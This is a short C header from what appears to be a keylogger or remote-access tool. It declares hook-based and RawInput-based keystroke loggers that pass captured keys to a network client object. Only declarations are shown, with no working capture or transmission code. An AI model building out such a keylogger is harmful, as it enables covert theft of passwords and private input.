#pragma once
#include "connection/client.h"


typedef void (*KeyLoggerInitFuncType)();

typedef struct KeyLoggerInterfaceStruct {
	void (*KeyLoggerInit)(client*);
	void (*KeyLoggerFini)();
} KeyLoggerInterface;

void LogKeyStoke(client* out, DWORD key_stroke);

extern KeyLoggerInterface HookKeyLogger;
// RawInput 方法的缺点是需要一个消息循环.
extern KeyLoggerInterface RawInputKeyLogger;